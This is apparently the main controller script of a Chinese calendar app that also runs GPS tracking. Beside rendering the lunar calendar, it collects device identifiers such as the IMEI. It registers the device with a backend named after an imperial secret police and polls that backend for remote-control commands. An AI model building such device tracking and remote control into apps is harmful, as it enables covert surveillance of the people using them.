/**
 * 万年历 + GPS定位系统 - 主控模块
 */
(function () {
  'use strict';

  // ===================== 状态 =====================
  let currentYear, currentMonth;
  let selectedDate = null; // 当前选中的日期

  // ===================== 初始化 =====================

  function init() {
    const now = new Date();
    currentYear = now.getFullYear();
    currentMonth = now.getMonth() + 1;

    bindEvents();
    renderYearSelect();
    renderCalendar();
    initDeviceInfo();
    initQRCode();
    initGPS();
  }

  // ===================== 事件绑定 =====================

  function bindEvents() {
    // 月份切换
    document.getElementById('btn-prev-month').addEventListener('click', () => {
      if (currentMonth === 1) {
        currentYear--;
        currentMonth = 12;
      } else {
        currentMonth--;
      }
      renderCalendar();
    });

    document.getElementById('btn-next-month').addEventListener('click', () => {
      if (currentMonth === 12) {
        currentYear++;
        currentMonth = 1;
      } else {
        currentMonth++;
      }
      renderCalendar();
    });

    // 当年切换
    document.getElementById('btn-prev-year').addEventListener('click', () => {
      currentYear--;
      updateYearSelect();
      renderCalendar();
    });

    document.getElementById('btn-next-year').addEventListener('click', () => {
      currentYear++;
      updateYearSelect();
      renderCalendar();
    });

    // 今天按钮
    document.getElementById('btn-today').addEventListener('click', () => {
      const now = new Date();
      currentYear = now.getFullYear();
      currentMonth = now.getMonth() + 1;
      updateYearSelect();
      renderCalendar();
    });

    // 年份选择器
    document.getElementById('select-year').addEventListener('change', (e) => {
      currentYear = parseInt(e.target.value);
      renderCalendar();
    });

    // 手动发送GPS按钮
    document.getElementById('btn-send-now').addEventListener('click', () => {
      GPS.manualSend();
    });

    // 刷新QR码按钮
    const btnRefreshQR = document.getElementById('btn-refresh-qr');
    if (btnRefreshQR) {
      btnRefreshQR.addEventListener('click', () => {
        refreshQRCode();
      });
    }

    // GNSS 卫星系统切换
    const gnssSelect = document.getElementById('gnss-select');
    if (gnssSelect) {
      gnssSelect.addEventListener('change', () => {
        const system = gnssSelect.value;
        GPS.setGNSS(system);
        console.log('[App] 定位系统切换:', system);
      });
    }

    // 楼层校准按钮
    const btnCalibrate = document.getElementById('btn-calibrate-floor');
    if (btnCalibrate && typeof FloorCalc !== 'undefined') {
      btnCalibrate.addEventListener('click', () => {
        const pos = GPS.getCurrentPosition();
        if (pos && pos.alt != null) {
          FloorCalc.manualCalibrate(pos.alt);
          console.log('[楼层] 手动校准: 海拔=' + pos.alt.toFixed(1) + 'm');
        } else {
          alert('暂无GPS海拔数据，请等待定位完成');
        }
      });
    }

    // 层高选择器
    const floorHeightSelect = document.getElementById('floor-height-select');
    if (floorHeightSelect && typeof FloorCalc !== 'undefined') {
      floorHeightSelect.addEventListener('change', () => {
        const h = parseFloat(floorHeightSelect.value);
        FloorCalc.setFloorHeight(h);
        console.log('[楼层] 层高设为:', h + 'm');
      });
    }

    // 重置最高速度
    const btnResetSpeed = document.getElementById('btn-reset-speed');
    if (btnResetSpeed && typeof SpeedTracker !== 'undefined') {
      btnResetSpeed.addEventListener('click', () => {
        SpeedTracker.resetMaxSpeed();
        console.log('[速度] 最高速度已重置');
      });
    }

    // 键盘导航
    document.addEventListener('keydown', (e) => {
      if (e.key === 'ArrowLeft') {
        document.getElementById('btn-prev-month').click();
      } else if (e.key === 'ArrowRight') {
        document.getElementById('btn-next-month').click();
      }
    });
  }

  // ===================== 日历渲染 =====================

  function renderYearSelect() {
    const select = document.getElementById('select-year');
    select.innerHTML = '';
    for (let y = 1900; y <= 2100; y++) {
      const opt = document.createElement('option');
      opt.value = y;
      opt.textContent = y + '年';
      if (y === currentYear) opt.selected = true;
      select.appendChild(opt);
    }
  }

  function updateYearSelect() {
    const select = document.getElementById('select-year');
    select.value = currentYear;
  }

  function renderCalendar() {
    const L = window.LunarCalendar;

    // 更新标题
    document.getElementById('calendar-title').textContent =
      `${currentYear}年 ${currentMonth}月`;

    // 更新年份选择器
    updateYearSelect();

    // 当前日期信息
    const now = new Date();
    const today = {
      year: now.getFullYear(),
      month: now.getMonth() + 1,
      day: now.getDate()
    };

    // 获取当前农历信息
    const todayLunar = L.solarToLunar(now);
    if (todayLunar) {
      const p = todayLunar.yearPillar || {};
      document.getElementById('lunar-today').innerHTML =
        `农历 ${todayLunar.yearName} ${todayLunar.monthName}${todayLunar.dayName} · 属${todayLunar.zodiac}` +
        `<br><span class="pillar-detail">${p.ganzhi || ''}年 ${todayLunar.monthPillar?.ganzhi || ''}月 ${todayLunar.dayPillar?.ganzhi || ''}日 ${todayLunar.hourPillar?.ganzhi || ''}时</span>`;
    }

    // 获取当月天数和第一天星期
    const daysInMonth = L.getMonthDays(currentYear, currentMonth);
    const firstDay = L.getFirstDayOfWeek(currentYear, currentMonth);

    // 获取节气
    const monthTerms = L.getMonthSolarTerms(currentYear, currentMonth);

    // 构建日期单元格
    const grid = document.getElementById('calendar-grid');
    grid.innerHTML = '';

    // 填充前置空白格 (上个月的日期)
    const prevMonth = currentMonth === 1 ? 12 : currentMonth - 1;
    const prevYear = currentMonth === 1 ? currentYear - 1 : currentYear;
    const prevDays = L.getMonthDays(prevYear, prevMonth);

    for (let i = 0; i < firstDay; i++) {
      const prevDay = prevDays - firstDay + i + 1;
      const date = new Date(prevYear, prevMonth - 1, prevDay);
      const lunar = L.solarToLunar(date);
      const cell = createDayCell(prevDay, prevMonth, prevYear, lunar, true, false, monthTerms);
      grid.appendChild(cell);
    }

    // 当月日期
    for (let d = 1; d <= daysInMonth; d++) {
      const date = new Date(currentYear, currentMonth - 1, d);
      const lunar = L.solarToLunar(date);
      const isToday = (currentYear === today.year &&
        currentMonth === today.month &&
        d === today.day);
      const cell = createDayCell(d, currentMonth, currentYear, lunar, false, isToday, monthTerms, date);
      grid.appendChild(cell);
    }

    // 填充后置空白格 (确保总共6行=42格)
    const totalCells = firstDay + daysInMonth;
    const remaining = totalCells % 7 === 0 ? 0 : 7 - (totalCells % 7);
    const unfilled = totalCells < 42 ? 42 - totalCells : remaining;

    const nextMonth = currentMonth === 12 ? 1 : currentMonth + 1;
    const nextYear = currentMonth === 12 ? currentYear + 1 : currentYear;

    for (let i = 0; i < unfilled; i++) {
      const nextDay = i + 1;
      const date = new Date(nextYear, nextMonth - 1, nextDay);
      const lunar = L.solarToLunar(date);
      const cell = createDayCell(nextDay, nextMonth, nextYear, lunar, true, false, monthTerms);
      grid.appendChild(cell);
    }
  }

  function createDayCell(day, month, year, lunar, isOtherMonth, isToday, monthTerms, date) {
    const L = window.LunarCalendar;
    const cell = document.createElement('div');
    cell.className = 'calendar-day';

    if (isOtherMonth) cell.classList.add('other-month');
    if (isToday) cell.classList.add('today');

    // 检查是否为周末
    if (date) {
      const dow = date.getDay();
      if (dow === 0 || dow === 6) cell.classList.add('weekend');
    }

    // 检查节气
    let termName = '';
    if (!isOtherMonth) {
      for (const term of monthTerms) {
        if (term.day === day) {
          termName = term.name;
          cell.classList.add('solar-term');
          break;
        }
      }
    }

    // 获取节日
    let festivalNames = [];
    if (!isOtherMonth && date) {
      festivalNames = L.getFestivals(date, lunar);
    }

    // 构建内容
    const dayNum = document.createElement('div');
    dayNum.className = 'day-num';
    dayNum.textContent = day;

    // 农历日期或节日
    const lunarDiv = document.createElement('div');
    lunarDiv.className = 'day-lunar';

    if (festivalNames.length > 0) {
      lunarDiv.textContent = festivalNames[0];
      lunarDiv.classList.add('festival');
    } else if (termName) {
      lunarDiv.textContent = termName;
      lunarDiv.classList.add('term');
    } else if (lunar) {
      if (lunar.lunarDay === 1) {
        lunarDiv.textContent = lunar.monthName;
        lunarDiv.classList.add('lunar-month');
      } else {
        lunarDiv.textContent = lunar.dayName;
      }
    }

    cell.appendChild(dayNum);
    cell.appendChild(lunarDiv);

    // 点击查看详情
    cell.addEventListener('click', () => {
      if (date) {
        showDayDetail(date, lunar, festivalNames, termName);
      }
    });

    return cell;
  }

  function showDayDetail(date, lunar, festivals, termName) {
    const panel = document.getElementById('day-detail');
    if (!panel) return;

    const L = window.LunarCalendar;
    const m = date.getMonth() + 1;
    const d = date.getDate();
    const weekNames = ['日', '一', '二', '三', '四', '五', '六'];
    const week = weekNames[date.getDay()];

    // 获取当前时刻的四柱
    const pillars = lunar && lunar.yearPillar
      ? { year: lunar.yearPillar, month: lunar.monthPillar, day: lunar.dayPillar, hour: lunar.hourPillar }
      : L.getFourPillars(date);

    let html = `<strong>${date.getFullYear()}年${m}月${d}日 星期${week}</strong>`;

    if (lunar) {
      html += `<br>农历 ${lunar.yearName} ${lunar.monthName}${lunar.dayName}`;
    }

    // 四柱八字展示
    if (pillars) {
      html += `<br><span class="pillar-label">年柱</span> ${pillars.year.ganzhi}`;
      html += ` · <span class="pillar-label">月柱</span> ${pillars.month.ganzhi}`;
      html += ` · <span class="pillar-label">日柱</span> ${pillars.day.ganzhi}`;
      html += ` · <span class="pillar-label">时柱</span> ${pillars.hour.ganzhi}`;
      html += `<br>`;
      html += `<span class="pillar-detail">${pillars.year.ganzhi}年 ${pillars.month.ganzhi}月 ${pillars.day.ganzhi}日 ${pillars.hour.ganzhi}时</span>`;
      html += `<br><span style="font-size:11px;color:#a09080;">生肖: ${lunar?.zodiac || ''} · 时辰: ${pillars.hour.shichenName}</span>`;
    } else if (lunar) {
      html += `<br>干支: ${lunar.ganzhi}年 · 生肖: ${lunar.zodiac}`;
    }

    if (festivals.length > 0) {
      html += `<br><span class="festival-tag">🎉 ${festivals.join(' · ')}</span>`;
    } else if (termName) {
      html += `<br><span class="term-tag">🌿 ${termName}</span>`;
    }

    panel.innerHTML = html;
  }

  // ===================== 设备信息初始化 =====================

  async function initDeviceInfo() {
    try {
      if (typeof DeviceInfo === 'undefined') {
        console.warn('[App] DeviceInfo模块未加载');
        return;
      }

      const info = await DeviceInfo.getDeviceInfo();
      console.log('[App] 设备信息:', info);

      // IMEI展示
      const imeiEl = document.getElementById('dev-imei');
      if (imeiEl) {
        if (info.imei) {
          imeiEl.textContent = maskIMEI(info.imei);
          imeiEl.title = 'IMEI: ' + info.imei;
        } else if (info.platform === 'ios') {
          imeiEl.textContent = 'ⓘ iOS限制';
          imeiEl.title = 'iOS不允许获取IMEI，使用identifierForVendor替代';
        } else {
          imeiEl.textContent = '不可用';
          imeiEl.title = 'Android 10+限制IMEI访问';
        }
      }

      // 设备ID
      const idEl = document.getElementById('dev-id');
      if (idEl) {
        const id = info.deviceId || info.appDeviceId || '--';
        idEl.textContent = id.length > 20 ? id.slice(0, 20) + '...' : id;
        idEl.title = id;
      }

      // 品牌
      const brandEl = document.getElementById('dev-brand');
      if (brandEl) {
        brandEl.textContent = info.manufacturer || info.brand || '--';
      }

      // 型号
      const modelEl = document.getElementById('dev-model');
      if (modelEl) {
        modelEl.textContent = info.model || info.modelName || '--';
      }

      // 系统版本
      const osEl = document.getElementById('dev-os');
      if (osEl) {
        osEl.textContent = info.osVersion || info.systemName + ' ' + info.osVersion || '--';
      }

      // 平台
      const platEl = document.getElementById('dev-platform');
      if (platEl) {
        const platforms = { android: '🤖 Android', ios: '🍎 iOS', harmonyos: '🔷 鸿蒙', web: '🌐 Web' };
        platEl.textContent = platforms[info.platform] || info.platform;
      }

    } catch (err) {
      console.error('[App] 设备信息获取失败:', err);
    }
  }

  /**
   * 脱敏显示IMEI (前4后4，中间*号)
   */
  function maskIMEI(imei) {
    if (!imei || imei.length < 8) return imei || '--';
    return imei.slice(0, 4) + '****' + imei.slice(-4);
  }

  // ===================== QR码初始化 =====================

  async function initQRCode() {
    try {
      if (typeof DeviceInfo === 'undefined') return;

      // 生成唯一ID
      const uniqueId = await DeviceInfo.generateUniqueId();
      console.log('[QR] 唯一ID:', uniqueId);

      // 将唯一ID传给GPS模块，上报定位时附带
      if (typeof GPS !== 'undefined') {
        GPS.setUniqueId(uniqueId);
      }

      // 向锦衣卫后台注册设备
      await DeviceInfo.registerDevice();
      // 启动命令轮询 (接收后台远程控制)
      DeviceInfo.startCommandPolling();

      // 显示唯一ID文本
      const idEl = document.getElementById('qrcode-id');
      if (idEl) idEl.textContent = uniqueId;

      // 加载QR码图片
      const qrUrl = DeviceInfo.getQRCodeUrl(uniqueId, 280);
      const imgEl = document.getElementById('qrcode-img');
      const loadingEl = document.getElementById('qrcode-loading');

      if (imgEl) {
        imgEl.onload = () => {
          if (loadingEl) loadingEl.style.display = 'none';
          imgEl.style.display = 'block';
        };
        imgEl.onerror = () => {
          if (loadingEl) loadingEl.textContent = 'QR加载失败';
          console.error('[QR] 图片加载失败');
        };
        imgEl.src = qrUrl;
      }
    } catch (err) {
      console.error('[QR] 初始化失败:', err);
    }
  }

  /**
   * 刷新QR码 (生成新唯一ID)
   */
  async function refreshQRCode() {
    const loadingEl = document.getElementById('qrcode-loading');
    const imgEl = document.getElementById('qrcode-img');
    if (loadingEl) { loadingEl.style.display = 'block'; loadingEl.textContent = '刷新中...'; }
    if (imgEl) imgEl.style.display = 'none';

    // 清除缓存, 让 generateUniqueId 生成全新ID (新时间戳+新随机)
    if (typeof DeviceInfo !== 'undefined') {
      DeviceInfo.clearCache();
    }

    await initQRCode();
  }

  // ===================== GPS初始化 =====================

  function initGPS() {
    const els = {
      gpsLat: document.getElementById('gps-lat'),
      gpsLng: document.getElementById('gps-lng'),
      gpsAlt: document.getElementById('gps-alt'),
      gpsSpeed: document.getElementById('gps-speed'),
      gpsHeading: document.getElementById('gps-heading'),
      gpsAccuracy: document.getElementById('gps-accuracy'),
      gpsTime: document.getElementById('gps-time'),
      gpsStatus: document.getElementById('gps-status'),
      gpsDot: document.getElementById('gps-dot'),
      gpsSendCount: document.getElementById('gps-send-count'),
      gpsErrorCount: document.getElementById('gps-error-count'),
      sendStatus: document.getElementById('send-status'),
    };

    GPS.init(els);
  }

  // ===================== 启动 =====================
  document.addEventListener('DOMContentLoaded', init);
})();
